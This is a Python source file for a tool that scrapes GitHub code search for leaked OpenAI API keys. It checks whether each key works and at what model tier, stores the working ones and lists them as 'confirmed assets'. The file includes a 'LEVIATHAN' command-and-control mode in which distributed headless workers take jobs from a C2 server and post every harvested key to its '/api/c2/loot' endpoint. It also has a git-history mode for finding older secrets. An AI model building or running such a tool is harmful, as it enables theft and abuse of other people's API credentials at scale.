"""
Scan GitHub for available OpenAI API Keys
"""

import argparse
import logging
import os
import time
from concurrent.futures import ThreadPoolExecutor

import rich
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from tqdm import tqdm

from configs import KEYWORDS, LANGUAGES, PATHS, REGEX_LIST
from manager import CookieManager, DatabaseManager, ProgressManager
# from utils import check_key # Deprecated
import utils # Import module instead to avoid circular issues
from forensics import extract_forensics, ForensicsData

def classify_context(url: str) -> tuple[int, str]:
    """
    Calculates the 'Risk Score' (0-100) based on the file context.
    Returns: (risk_score, context_tag)
    """
    url_lower = url.lower()
    
    if any(x in url_lower for x in [".env", "config", "secret", "key", "password", "prod"]):
        return 90, "CRITICAL_PRODUCTION_CONFIG"
    if any(x in url_lower for x in ["test", "mock", "example", "sample", "demo"]):
        return 10, "LOW_RISK_TEST_ARTIFACT"
    if any(x in url_lower for x in ["doc", "readme", "instruction"]):
        return 5, "DOCUMENTATION"
    
    return 50, "UNCERTAIN_CONTEXT"

FORMAT = "%(message)s"
logging.basicConfig(level=logging.INFO, format=FORMAT, datefmt="[%X]")
log = logging.getLogger("Airtouch-Scanner")
httpx_logger = logging.getLogger("httpx")
httpx_logger.setLevel(logging.WARNING)


class APIKeyLeakageScanner:
    """
    Scan GitHub for available OpenAI API Keys
    """

    def __init__(self, db_file: str, keywords: list, languages: list, specific_queries: list = None, ghost_mode: bool = False, c2_url: str = None, swarm_secret: str = None):
        self.db_file = db_file
        self.driver: webdriver.Chrome | None = None
        self.cookies: CookieManager | None = None
        self.ghost_mode = ghost_mode
        self.c2_url = c2_url
        self.swarm_secret = swarm_secret
        rich.print(f"[bold cyan]⚡ INITIALIZING NEURAL MEMORY CORE ({self.db_file})...[/bold cyan]")

        self.dbmgr = DatabaseManager(self.db_file)

        self.keywords = keywords
        self.languages = languages
        self.candidate_urls = []
        
        # If specific queries are provided (Worker Mode), use those.
        # Otherwise, generate full list (Legacy/Queue-Builder Mode).
        if specific_queries:
            self.candidate_urls = specific_queries
            self.is_worker = True
            rich.print(f"[bold green]🤖 WORKER ONLINE. PROCESSING {len(self.candidate_urls)} ASSIGNED TARGETS.[/bold green]")
        else:
            self.is_worker = False
            rich.print("[bold yellow]📡 GENERATING GLOBAL TARGET MATRIX...[/bold yellow]")
            for regex, too_many_results, _ in REGEX_LIST:
                for path in PATHS:
                    self.candidate_urls.append(f"https://github.com/search?q=(/{regex.pattern}/)+AND+({path})&type=code&ref=advsearch")

                for language in self.languages:
                    if too_many_results:
                        self.candidate_urls.append(f"https://github.com/search?q=(/{regex.pattern}/)+language:{language}&type=code&ref=advsearch")
                    else:
                        self.candidate_urls.append(f"https://github.com/search?q=(/{regex.pattern}/)&type=code&ref=advsearch")
            rich.print(f"[bold cyan]📊 MATRIX GENERATED: {len(self.candidate_urls)} SECTORS TARGETED.[/bold cyan]")

    def login_to_github(self):
        """
        Login to GitHub
        """
        rich.print("[bold green]🚀 LAUNCHING CHROMIUM INTERCEPTOR...[/bold green]")

        options = webdriver.ChromeOptions()
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--ignore-ssl-errors")
        
        if self.ghost_mode:
            rich.print("[bold magenta]👻 GHOST MODE ENGAGED. UI SUPPRESSED.[/bold magenta]")
            options.add_argument("--headless=new")
            options.add_argument("--disable-gpu")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            # Block images and other heavy assets for speed
            prefs = {
                "profile.managed_default_content_settings.images": 2, 
                "profile.managed_default_content_settings.stylesheets": 2,
                "profile.managed_default_content_settings.fonts": 2
            }
            options.add_experimental_option("prefs", prefs)

        self.driver = webdriver.Chrome(options=options)
        self.driver.implicitly_wait(2.0)

        self.cookies = CookieManager(self.driver)

        if os.path.exists("cookies.pkl"):
             self.cookies.load()

        # Check if login is actually valid
        self.driver.get("https://github.com/")
        try:
            # If "Sign in" button exists, we are NOT logged in
            if self.driver.find_elements(by=By.XPATH, value="//*[contains(text(), 'Sign in')]"):
                 is_logged_in = False
            else:
                 is_logged_in = True
        except:
            is_logged_in = False

        if not is_logged_in:
            if self.ghost_mode:
                 rich.print("[bold red]❌ GHOST PROTOCOL FAILED. NO VALID COOKIES.[/bold red]")
                 sys.exit(1)
            
            rich.print("[bold yellow]⚠️  AUTHENTICATION REQUIRED.[/bold yellow]")
            rich.print("[bold cyan]👉 Please Login to GitHub in the opened browser window to continue...[/bold cyan]")
            
            self.driver.get("https://github.com/login")
            
            # Polling Loop: Wait for user to login
            while True:
                time.sleep(2)
                try:
                    # Check for indicators of success
                    # 1. URL change (no longer login)
                    # 2. Presence of user meta tag or absence of login form
                    curr_url = self.driver.current_url
                    if "github.com/login" not in curr_url and "session" not in curr_url:
                        # Double check by looking for 'Sign in' button again
                        if not self.driver.find_elements(by=By.XPATH, value="//*[contains(text(), 'Sign in')]"):
                             rich.print("[bold green]✅ LOGIN DETECTED. RESUMING...[/bold green]")
                             break
                except Exception:
                    pass
            
            # Save the fresh cookies
            self.cookies.save()
        else:
            rich.print("[bold green]🔓 AUTHENTICATION VERIFIED. ACCESS GRANTED.[/bold green]")

        self.cookies.verify_user_login()

    def _expand_all_code(self):
        """
        Expand all the code in the current page
        """
        elements = self.driver.find_elements(by=By.XPATH, value="//*[contains(text(), 'more match')]")
        for element in elements:
            element.click()

    def _find_urls_and_apis(self) -> tuple[list[str], list[str], ForensicsData]:
        """
        Find all the urls and apis in the current page, plus forensics.
        """
        apis_found = []
        urls_need_expand = []
        forensics = ForensicsData()

        codes = self.driver.find_elements(by=By.CLASS_NAME, value="code-list")  # type: ignore
        
        # Forensics: Try to extract stars/forks from the page if code blocks exist
        if codes:
            try:
                forensics = extract_forensics(self.driver, codes[0].text, "")
            except:
                pass

        for element in codes:
            apis = []
            # Check all regex for each code block
            for regex, _, too_long in REGEX_LIST[2:]:
                if not too_long:
                    found = regex.findall(element.text)
                    if found:
                        apis.extend(found)
                        # Capture snippet if we find an API and haven't captured one yet
                        if forensics.snippet == "N/A":
                             forensics = extract_forensics(self.driver, element.text, found[0])

            if len(apis) == 0:
                # Need to show full code. (because the api key is too long)
                # get the <a> tag
                a_tag = element.find_element(by=By.XPATH, value=".//a")
                urls_need_expand.append(a_tag.get_attribute("href"))
            apis_found.extend(apis)

        return apis_found, urls_need_expand, forensics

    def _process_url(self, url: str):
        """
        Process a search query url
        """
        if self.driver is None:
            raise ValueError("Driver is not initialized")

        self.driver.get(url)

        while True:  # Loop until all the pages are processed
            # If current webpage is reached the rate limit, then wait for 30 seconds
            if self.driver.find_elements(by=By.XPATH, value="//*[contains(text(), 'You have exceeded a secondary rate limit')]"):
                for _ in tqdm(range(30), desc="[bold red]⛔ SYSTEM OVERLOAD DETECTED. ENGAGING COOL-DOWN PROTOCOLS...[/bold red]"):
                    time.sleep(1)
                self.driver.refresh()
                continue

            self._expand_all_code()
            
            # Unpack forensics data
            apis_found, urls_need_expand, forensics = self._find_urls_and_apis()
            rich.print(f"    [bold cyan]🛸 {len(urls_need_expand)} ENCRYPTION KEYS FOUND. PREPARING EXTRACTION...[/bold cyan]")

            try:
                next_buttons = self.driver.find_elements(by=By.XPATH, value="//a[@aria-label='Next Page']")
                rich.print("[dim]🔍 SCANNING NEXT SECTOR...[/dim]")
                WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, "//a[@aria-label='Next Page']")))
                next_buttons = self.driver.find_elements(by=By.XPATH, value="//a[@aria-label='Next Page']")
                next_buttons[0].click()
            except Exception:  # pylint: disable=broad-except
                rich.print("[bold red]🛑 SECTOR SCAN COMPLETE. NO FURTHER TARGETS.[/bold red]")
                break

        # Handle the expand_urls
        for u in tqdm(urls_need_expand, desc="[bold magenta]⚡ EXECUTING DEEP SCAN ON EXPANDED TARGETS...[/bold magenta]"):
            if self.driver is None:
                raise ValueError("Driver is not initialized")

            with self.dbmgr as mgr:
                if mgr.get_url(u):
                    rich.print(f"    [dim]⏭️  TARGET {u[-15:]} ALREADY COMPROMISED. SKIPPING...[/dim]")
                    continue

            self.driver.get(u)
            # Optimized Wait: Wait for body instead of sleep
            try:
                WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            except:
                time.sleep(1) # Fallback (Optimized)

            # Optimized Retry Loop (Reliability > Raw Speed)
            retry = 0
            while retry < 2:
                matches = []
                for regex, _, _ in REGEX_LIST:
                    matches.extend(regex.findall(self.driver.page_source))
                matches = list(set(matches))
                
                if len(matches) > 0:
                    break
                    
                # If no matches, wait slightly and retry (for dynamic content)
                time.sleep(1.5)
                retry += 1

            if len(matches) > 0:
                with self.dbmgr as mgr:
                    new_apis = [api for api in matches if not mgr.key_exists(api)]
                    new_apis = list(set(new_apis))
                apis_found.extend(new_apis)
                rich.print(f"    [bold green]🎯 TARGET ACQUIRED. {len(matches)} POTENTIAL VECTORS IDENTIFIED.[/bold green]")
                for match in matches:
                    rich.print(f"        [cyan]'{match[:10]}...{match[-10:]}'[/cyan]")

                with self.dbmgr as mgr:
                    mgr.insert_url(url)
                break

        # Pass the source URL for context scoring AND forensics
        self.check_api_keys_and_save(apis_found, source_url=url, forensics=forensics)

    def check_api_keys_and_save(self, keys: list[str], source_url: str = "", forensics: ForensicsData = None):
        """
        Check a list of API keys using HMCS (Hierarchical Model Clearance System)
        """

        # [LEVIATHAN] C2 Capture Hook: Immediately exfiltrate keys to Command & Control
        if hasattr(self, "c2_url") and self.c2_url:
            import requests
            for key_str in list(set(keys)):
                try:
                    payload = {
                        "key": key_str, 
                        "context": "distributed_worker", 
                        "source": source_url,
                        "forensics": forensics.snippet if forensics else "N/A"
                    }
                    headers = {"X-Swarm-Secret": self.swarm_secret} if self.swarm_secret else {}
                    requests.post(f"{self.c2_url}/api/c2/loot", json=payload, headers=headers, timeout=5)
                    rich.print(f"[bold green]📡 UPSTREAMED TO C2: {key_str[:10]}...[/bold green]")
                except Exception as e:
                    rich.print(f"[bold red]⚠️ C2 UPLOAD FAILED: {e}[/bold red]")

        if forensics is None:
             forensics = ForensicsData()

        with self.dbmgr as mgr:
            unique_keys = list(set(keys))
            unique_keys = [api for api in unique_keys if not mgr.key_exists(api)]
        
        # Calculate context risk once for this batch (assuming they came from the same URL)
        risk_score, context_tag = classify_context(source_url)

        # OPTIMIZATION: Process max parallel threads for validation
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(utils.check_key_tier, unique_keys))
            with self.dbmgr as mgr:
                for idx, result in enumerate(results):
                    # result is now a ValidationResult object
                    mgr.insert(
                        unique_keys[idx], 
                        result.status, 
                        model_tier=result.model_tier,
                        risk_score=risk_score, 
                        context_tag=context_tag,
                        repo_stars=forensics.repo_stars,
                        repo_forks=forensics.repo_forks,
                        snippet=forensics.snippet,
                        is_dataset=forensics.is_dataset
                    )

    def search(self, from_iter: int | None = None):
        """
        Search for API keys, and save the results to the database
        """
        progress = ProgressManager()
        total = len(self.candidate_urls)
        pbar = tqdm(
            enumerate(self.candidate_urls),
            total=total,
            desc="[bold blue]📡 SCANNING GLOBAL NETWORKS...[/bold blue]",
        )
        
        # In Worker Mode (distributed), always start from 0 and don't save global progress
        if getattr(self, "is_worker", False):
            if from_iter is None:
                from_iter = 0
            # Don't load from progress.json as it pertains to the global list
        else:
            if from_iter is None:
                from_iter = progress.load(total=total)

        for idx, url in enumerate(self.candidate_urls):
            if idx < from_iter:
                pbar.update()
                time.sleep(0.01)  # Optimized skip speed
                log.debug("⏭️  Skipping %s", url)
                continue
            self._process_url(url)
            
            # Only save global progress if not in worker mode
            if not getattr(self, "is_worker", False):
                progress.save(idx, total)
                
            log.debug("✅ Finished %s", url)
            pbar.update()
        pbar.close()

    def deduplication(self):
        """
        Deduplicate the database
        """
        with self.dbmgr as mgr:
            mgr.deduplicate()

    def update_existed_keys(self):
        """
        Update previously checked API keys in the database with their current status
        """
        with self.dbmgr as mgr:
            rich.print("[bold yellow]🔄 RE-VERIFYING DATABASE INTEGRITY...[/bold yellow]")
            keys = mgr.all_keys()
            for key in tqdm(keys, desc="[bold yellow]🔄 UPDATING KEY STATUS...[/bold yellow]"):
                # key[0] is the apikey string. We need to pass it to check_key_tier
                result = utils.check_key_tier(key[0])
                mgr.delete(key[0])
                # Context is lost on re-check (or we could fetch it), for now we reset risk/context or keep it?
                # The prompt asks for research feature, let's just re-insert with default or "Re-verified" context if we don't query it.
                # Actually, better to just update status/tier. But current manager.delete+insert pattern destroys old data.
                # For this task, I'll just re-insert with "Re-verified" context to signify it's a check.
                mgr.insert(key[0], result.status, model_tier=result.model_tier, context_tag="REVERIFIED_BATCH")

    def update_iq_keys(self):
        """
        Update insuffcient quota keys
        """
        with self.dbmgr as mgr:
            rich.print("[bold yellow]🔄 RETRYING EXHAUSTED QUOTAS...[/bold yellow]")
            keys = mgr.all_iq_keys()
            for key in tqdm(keys, desc="[bold yellow]🔄 CHECKING QUOTA STATUS...[/bold yellow]"):
                result = utils.check_key_tier(key[0])
                mgr.delete(key[0])
                mgr.insert(key[0], result.status, model_tier=result.model_tier, context_tag="REVERIFIED_QUOTA")

    def all_available_keys(self) -> list:
        """
        Get all available keys
        """
        with self.dbmgr as mgr:
            return mgr.all_keys()

    def __del__(self):
        if hasattr(self, "driver") and self.driver is not None:
            self.driver.quit()


def main():
    """
    Main function to scan GitHub for available OpenAI API Keys
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("--from-iter", type=int, default=None, help="Start from the specific iteration")
    parser.add_argument(
        "--debug",
        action="store_true",
        default=False,
        help="Enable debug mode, otherwise INFO mode. Default is False (INFO mode)",
    )
    parser.add_argument(
        "-ceko",
        "--check-existed-keys-only",
        action="store_true",
        default=False,
        help="Only check existed keys",
    )
    parser.add_argument(
        "-ciq",
        "--check-insuffcient-quota",
        action="store_true",
        default=False,
        help="Check and update status of the insuffcient quota keys",
    )
    parser.add_argument(
        "-k",
        "--keywords",
        nargs="+",
        default=KEYWORDS,
        help="Keywords to search",
    )
    parser.add_argument(
        "-l",
        "--languages",
        nargs="+",
        default=LANGUAGES,
        help="Languages to search",
    )
    parser.add_argument(
        "--query-list", 
        type=str, 
        default=None, 
        help="JSON string or delimiter-separated list of specific queries to scan (Worker Mode)"
    )
    parser.add_argument(
        "--ghost", 
        action="store_true", 
        default=False, 
        help="Enable Ghost Mode (Headless, Optimized)"
    )
    parser.add_argument(
        "--c2-url", 
        type=str,
        default=None, 
        help="Command & Control Server URL for Distributed Worker Mode"
    )

    parser.add_argument(
        "--git-history", 
        type=str,
        default=None, 
        help="Target Repository URL for Time Travel (Deep History Scan)"
    )

    parser.add_argument(
        "--swarm-secret", 
        type=str,
        default=None, 
        help="Secret Token for C2 Authentication"
    )

    args = parser.parse_args()

    if args.debug:
        log.setLevel(logging.DEBUG)
    else:
        log.setLevel(logging.INFO)

    # Clean up proxy env vars if they exist
    if os.environ.get("HTTP_PROXY"):
        del os.environ["HTTP_PROXY"]
    if os.environ.get("HTTPS_PROXY"):
        del os.environ["HTTPS_PROXY"]

    # [TIME TRAVEL] Phase 6
    if args.git_history:
        from chronos_git import ChronosGitScanner
        rich.print(f"[bold magenta]🕰️  TIME TRAVEL INITIATED: {args.git_history}[/bold magenta]")
        
        scanner = ChronosGitScanner(args.git_history)
        if scanner.clone_repo():
            history_keys = scanner.scan_history()
            
            # Save Findings
            if history_keys:
                dbmgr = DatabaseManager("github.db") # Local instance
                with dbmgr as mgr:
                    for item in history_keys:
                        # Insert with special context
                        # Using insert wrapper or raw?
                        # mgr.insert checks existence.
                        # We want to force insert if it's new, or update context?
                        # Let's simple insert.
                        
                        # We need to validate tier first? No, history keys might be dead.
                        # But we should check them.
                        rich.print(f"   [dim]Verifying historical artifact: {item['key'][:10]}...[/dim]")
                        validation = utils.check_key_tier(item['key'])
                        
                        mgr.insert(
                            item['key'],
                            validation.status,
                            model_tier=validation.model_tier,
                            context_tag=f"{item['type']} ({item['date']})" 
                        )
                rich.print(f"[bold green]💾 SAVED {len(history_keys)} HISTORICAL ARTIFACTS TO DATABASE.[/bold green]")
            else:
                rich.print("[bold yellow]🤷 NO HISTORICAL ANOMALIES FOUND.[/bold yellow]")
        
        return # Exit after time travel

    # Parse query list if provided

    # Parse query list if provided
    specific_queries = None
    if args.query_list:
        import json
        try:
            specific_queries = json.loads(args.query_list)
        except json.JSONDecodeError:
            specific_queries = args.query_list.split("|||") # Fallback delimiter

    # [LEVIATHAN] C2 DISTRIBUTED WORKER LOOP
    if args.c2_url:
        import requests
        rich.print(f"[bold red]🔗 CONNECTING TO C2 SERVER: {args.c2_url}[/bold red]")
        
        # Init scanner once (persistent browser)
        scanner = APIKeyLeakageScanner(
            "github.db", 
            KEYWORDS, 
            LANGUAGES, 
            ghost_mode=args.ghost,
            c2_url=args.c2_url,
            swarm_secret=args.swarm_secret
        )
        scanner.login_to_github()
        
        rich.print("[bold green]✅ AUTHENTICATED. WAITING FOR C2 COMMANDS...[/bold green]")
        
        while True:
            try:
                headers = {"X-Swarm-Secret": args.swarm_secret} if args.swarm_secret else {}
                
                # 1. Heartbeat
                requests.post(f"{args.c2_url}/api/c2/heartbeat", json={
                    "node_id": "worker_" + os.uname().nodename,
                    "status": "idle"
                }, headers=headers, timeout=5)

                # 2. Get Job
                res = requests.get(f"{args.c2_url}/api/c2/job", headers=headers, timeout=10)
                job_data = res.json()
                target_url = job_data.get("job")

                if target_url:
                    rich.print(f"[bold green]🎯 JOB RECEIVED: {target_url}[/bold green]")
                    # Override candidate_urls and search
                    scanner.candidate_urls = [target_url]
                    scanner.search(from_iter=0) 
                else:
                    time.sleep(2) # Idle polling
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                rich.print(f"[bold red]⚠️ C2 CONNECTION LOST: {e}[/bold red]")
                time.sleep(5)
        return # Exit after loop

    leakage = APIKeyLeakageScanner(
        "github.db", 
        KEYWORDS, 
        LANGUAGES, 
        specific_queries=specific_queries, 
        ghost_mode=args.ghost
    )

    if args.check_existed_keys_only:
        leakage.update_existed_keys()
    elif args.check_insuffcient_quota:
        leakage.update_iq_keys()
    else:
        leakage.login_to_github()
        leakage.search(from_iter=args.from_iter)
        leakage.update_existed_keys()
        leakage.deduplication()
        keys = leakage.all_available_keys()

        rich.print(f"[bold green]💰 TOTAL CONFIRMED ASSETS ({len(keys)}):[/bold green]")
        for key in keys:
            rich.print(f"[bold green]💸 {key[0]}[/bold green]")


if __name__ == "__main__":
    main()
